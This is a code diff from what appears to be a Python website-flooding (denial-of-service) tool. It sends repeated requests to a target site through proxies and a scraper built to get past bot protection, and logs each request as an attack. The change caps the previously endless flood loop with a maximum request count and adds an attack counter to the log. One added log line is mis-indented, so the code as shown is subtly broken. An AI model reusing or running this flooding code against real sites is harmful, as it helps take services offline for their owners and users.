@@ -87,19 +87,19 @@ def mainth(site: str):
                     {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                 response = scraper.get(site, timeout=10)
                 if 200 <= response.status_code <= 302:
-                    while True:
+                    while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
                         response = scraper.get(site, timeout=10)
                         if response.status_code >= 400:
                             break
                         attacks_number += 1
-                        logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
+                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         else:
-            while True:
+            while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
                 response = scraper.get(site, timeout=10)
                 if response.status_code >= 400:
                     break
                 attacks_number += 1
-                logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
+                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
     except ConnectionError as exc:
